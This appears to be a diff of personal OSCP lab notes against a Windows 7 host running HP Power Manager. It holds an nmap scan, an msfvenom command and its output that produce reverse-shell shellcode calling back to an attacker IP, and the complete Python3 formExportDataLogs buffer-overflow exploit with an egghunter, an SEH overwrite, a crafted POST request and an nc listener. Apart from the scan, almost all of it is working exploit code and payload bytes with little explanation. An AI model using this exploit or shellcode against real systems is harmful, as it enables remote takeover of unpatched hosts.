@@ -1,0 +1,203 @@
+└─$ nmap -sC -sV -Pn 192.168.201.45 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 01:02 +08
+Nmap scan report for 192.168.201.45
+Host is up (0.34s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               GoAhead WebServer
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.201.45/index.asp
+|_http-server-header: GoAhead-Webs
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2022-02-14T16:29:03
+|_Not valid after:  2022-08-16T16:29:03
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2022-04-07T17:04:00+00:00
+|_ssl-date: 2022-04-07T17:04:13+00:00; 0s from scanner time.
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-04-07T17:04:00
+|_  start_date: 2022-04-07T16:49:14
+|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::-
+|   Computer name: kevin
+|   NetBIOS computer name: KEVIN\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-04-07T10:04:00-07:00
+|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:fa:6c (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 133.94 seconds
+
+
+                                                                                                                                                                        
+┌──(george93㉿kali)-[~/OSCP-Files/HP-Power-Manager-Buffer-Overflow-Python3]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.201 LPORT=445  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of python file: 1700 bytes
+buf =  b""
+buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+buf += b"\x76\x0e\xd2\x9f\x85\xb0\x83\xee\xfc\xe2\xf4\x2e\x77"
+buf += b"\x07\xb0\xd2\x9f\xe5\x39\x37\xae\x45\xd4\x59\xcf\xb5"
+buf += b"\x3b\x80\x93\x0e\xe2\xc6\x14\xf7\x98\xdd\x28\xcf\x96"
+buf += b"\xe3\x60\x29\x8c\xb3\xe3\x87\x9c\xf2\x5e\x4a\xbd\xd3"
+buf += b"\x58\x67\x42\x80\xc8\x0e\xe2\xc2\x14\xcf\x8c\x59\xd3"
+buf += b"\x94\xc8\x31\xd7\x84\x61\x83\x14\xdc\x90\xd3\x4c\x0e"
+buf += b"\xf9\xca\x7c\xbf\xf9\x59\xab\x0e\xb1\x04\xae\x7a\x1c"
+buf += b"\x13\x50\x88\xb1\x15\xa7\x65\xc5\x24\x9c\xf8\x48\xe9"
+buf += b"\xe2\xa1\xc5\x36\xc7\x0e\xe8\xf6\x9e\x56\xd6\x59\x93"
+buf += b"\xce\x3b\x8a\x83\x84\x63\x59\x9b\x0e\xb1\x02\x16\xc1"
+buf += b"\x94\xf6\xc4\xde\xd1\x8b\xc5\xd4\x4f\x32\xc0\xda\xea"
+buf += b"\x59\x8d\x6e\x3d\x8f\xf7\xb6\x82\xd2\x9f\xed\xc7\xa1"
+buf += b"\xad\xda\xe4\xba\xd3\xf2\x96\xd5\x60\x50\x08\x42\x9e"
+buf += b"\x85\xb0\xfb\x5b\xd1\xe0\xba\xb6\x05\xdb\xd2\x60\x50"
+buf += b"\xe0\x82\xcf\xd5\xf0\x82\xdf\xd5\xd8\x38\x90\x5a\x50"
+buf += b"\x2d\x4a\x12\xda\xd7\xf7\x45\x18\xe3\x56\xed\xb2\xd2"
+buf += b"\x9e\x38\x39\x34\xf5\x95\xe6\x85\xf7\x1c\x15\xa6\xfe"
+buf += b"\x7a\x65\x57\x5f\xf1\xbc\x2d\xd1\x8d\xc5\x3e\xf7\x75"
+buf += b"\x05\x70\xc9\x7a\x65\xba\xfc\xe8\xd4\xd2\x16\x66\xe7"
+buf += b"\x85\xc8\xb4\x46\xb8\x8d\xdc\xe6\x30\x62\xe3\x77\x96"
+buf += b"\xbb\xb9\xb1\xd3\x12\xc1\x94\xc2\x59\x85\xf4\x86\xcf"
+buf += b"\xd3\xe6\x84\xd9\xd3\xfe\x84\xc9\xd6\xe6\xba\xe6\x49"
+buf += b"\x8f\x54\x60\x50\x39\x32\xd1\xd3\xf6\x2d\xaf\xed\xb8"
+buf += b"\x55\x82\xe5\x4f\x07\x24\x65\xad\xf8\x95\xed\x16\x47"
+buf += b"\x22\x18\x4f\x07\xa3\x83\xcc\xd8\x1f\x7e\x50\xa7\x9a"
+buf += b"\x3e\xf7\xc1\xed\xea\xda\xd2\xcc\x7a\x65"
+                                                     
+
+
+
+exploit used:
+
+sudo python3 hp_pm_exploit_p3.py 192.168.201.45 80 445
+
+https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py
+
+#!/usr/bin/python
+# This is a python3 port / extension of the HP Power Manager 'formExportDataLogs' Buffer Overflow Script by Muhammad Haidari
+# For the original script visit: https://github.com/Muhammd/HP-Power-Manager
+# 
+# Usage: python3 hp_pm_exploit_p3.py <Remote IP Address> <Remote Port> <Local Listener Port>
+# <Remote IP Address>: ip address the HP Power Manager is running on
+# <Remote Port>: port the application is running on
+# <Local Listener Port>: local port your shellcode is connecting back to -> script starts nc listener to catch reverse shell
+#
+# Swap out the shellcode
+# Tested on HP Power Manager 4.2 (Build 7) on Windows 7 Ultimate (6.1.7600 N/A Build 7600)
+# Author: CountablyInfinite
+
+from urllib import parse
+from time import sleep
+from sys import argv,exit
+from socket import socket,AF_INET,SOCK_STREAM
+from os import system
+
+try:
+   HOST  = argv[1]
+   PORT = int(argv[2]) # port the remote application is running on
+   LPORT = int(argv[3]) # port the shellcode is connecting back to -> listener gets sta
+   if (len(argv)>4):
+      raise IndexError
+except IndexError: 
+   print("Usage: python3 %s <Remote IP Address> <Remote Port> <Local Listener Port>" % argv[0])
+   print("Example: python3 %s 10.10.0.1 80 4411" % argv[0])
+   exit()
+
+#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
+egg = "b33fb33f"
+buf = egg
+buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+buf += "\x76\x0e\xd2\x9f\x85\xb0\x83\xee\xfc\xe2\xf4\x2e\x77"
+buf += "\x07\xb0\xd2\x9f\xe5\x39\x37\xae\x45\xd4\x59\xcf\xb5"
+buf += "\x3b\x80\x93\x0e\xe2\xc6\x14\xf7\x98\xdd\x28\xcf\x96"
+buf += "\xe3\x60\x29\x8c\xb3\xe3\x87\x9c\xf2\x5e\x4a\xbd\xd3"
+buf += "\x58\x67\x42\x80\xc8\x0e\xe2\xc2\x14\xcf\x8c\x59\xd3"
+buf += "\x94\xc8\x31\xd7\x84\x61\x83\x14\xdc\x90\xd3\x4c\x0e"
+buf += "\xf9\xca\x7c\xbf\xf9\x59\xab\x0e\xb1\x04\xae\x7a\x1c"
+buf += "\x13\x50\x88\xb1\x15\xa7\x65\xc5\x24\x9c\xf8\x48\xe9"
+buf += "\xe2\xa1\xc5\x36\xc7\x0e\xe8\xf6\x9e\x56\xd6\x59\x93"
+buf += "\xce\x3b\x8a\x83\x84\x63\x59\x9b\x0e\xb1\x02\x16\xc1"
+buf += "\x94\xf6\xc4\xde\xd1\x8b\xc5\xd4\x4f\x32\xc0\xda\xea"
+buf += "\x59\x8d\x6e\x3d\x8f\xf7\xb6\x82\xd2\x9f\xed\xc7\xa1"
+buf += "\xad\xda\xe4\xba\xd3\xf2\x96\xd5\x60\x50\x08\x42\x9e"
+buf += "\x85\xb0\xfb\x5b\xd1\xe0\xba\xb6\x05\xdb\xd2\x60\x50"
+buf += "\xe0\x82\xcf\xd5\xf0\x82\xdf\xd5\xd8\x38\x90\x5a\x50"
+buf += "\x2d\x4a\x12\xda\xd7\xf7\x45\x18\xe3\x56\xed\xb2\xd2"
+buf += "\x9e\x38\x39\x34\xf5\x95\xe6\x85\xf7\x1c\x15\xa6\xfe"
+buf += "\x7a\x65\x57\x5f\xf1\xbc\x2d\xd1\x8d\xc5\x3e\xf7\x75"
+buf += "\x05\x70\xc9\x7a\x65\xba\xfc\xe8\xd4\xd2\x16\x66\xe7"
+buf += "\x85\xc8\xb4\x46\xb8\x8d\xdc\xe6\x30\x62\xe3\x77\x96"
+buf += "\xbb\xb9\xb1\xd3\x12\xc1\x94\xc2\x59\x85\xf4\x86\xcf"
+buf += "\xd3\xe6\x84\xd9\xd3\xfe\x84\xc9\xd6\xe6\xba\xe6\x49"
+buf += "\x8f\x54\x60\x50\x39\x32\xd1\xd3\xf6\x2d\xaf\xed\xb8"
+buf += "\x55\x82\xe5\x4f\x07\x24\x65\xad\xf8\x95\xed\x16\x47"
+buf += "\x22\x18\x4f\x07\xa3\x83\xcc\xd8\x1f\x7e\x50\xa7\x9a"
+buf += "\x3e\xf7\xc1\xed\xea\xda\xd2\xcc\x7a\x65"
+
+#egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
+hunter =  b""
+hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
+hunter += b"\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
+hunter += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+buffer = b"\x41" * (721 -len(hunter))
+buffer += b"\x90"*30 + hunter
+buffer += b"\xeb\xc2\x90\x90"            #JMP SHORT 0xC2 
+buffer += b"\xd5\x74\x41" 	              #pop esi # pop ebx # ret 10 (DevManBE.exe)
+
+content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
+content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"
+
+payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
+payload += "Host: %s\r\n" % HOST
+payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
+payload += "Accept: %s\r\n" % buf
+payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
+payload += "Content-Type: application/x-www-form-urlencoded\r\n"
+payload += "Content-Length: %s\r\n\r\n" % len(content)
+payload += content
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((HOST, PORT))
+print("[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit")
+print("[+] Sending exploit to Ip " +str(HOST)+" on port "+str(PORT)+". Starting local listener on port "+str(LPORT))
+s.send(payload.encode('latin1'))
+system("nc -nlvp "+ str(LPORT))
+s.close()
